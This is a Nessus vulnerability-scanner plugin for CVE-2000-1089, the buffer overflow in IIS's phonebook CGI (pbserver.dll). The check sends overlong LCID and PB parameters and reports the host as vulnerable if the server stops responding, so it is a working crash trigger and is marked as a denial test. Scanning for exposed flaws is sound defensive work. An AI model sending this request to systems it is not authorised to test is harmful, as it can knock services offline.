#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10564);
 script_bugtraq_id(2048);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-1089");

 name["english"] = "IIS phonebook";
 name["francais"] = "phonebook";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The CGI /pbserver/pbserver.dll is subject to a buffer
overflow attack that allows an attacker to execute
arbitrary commands on this host.

Solution : See http://www.microsoft.com/technet/security/bulletin/ms00-094.mspx
Risk factor : High";


 desc["francais"] = "
Le CGI /pbserver/pbserver.dll est vulnérable à une attaque
par dépassement de buffer qui permet à un pirate
d'executer des commandes arbitraires sur ce système.

Solution : Cf http://www.microsoft.com/technet/security/bulletin/ms00-094.mspx
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Determines whether phonebook server is installed";
 summary["francais"] = "Determines si le serveur phonebook est installé";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);


if(get_port_state(port))
{
  req = http_get(item:"/pbserver/pbserver.dll", port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if("Bad Request" >< r)
  {
    req = http_get(item:string("/pbserver/pbserver.dll?OSArch=0&OSType=2&LCID=", 
    			       crap(200), 
			       "&PBVer=0&PB=",
    				crap(200)), port:port);
				
    r = http_keepalive_send_recv(port:port, data:req);
    req = http_get(item:"/pbserver/pbserver.dll", port:port);
    r = http_keepalive_send_recv(port:port, data:req);
    if(!r)security_hole(port);
  }
}
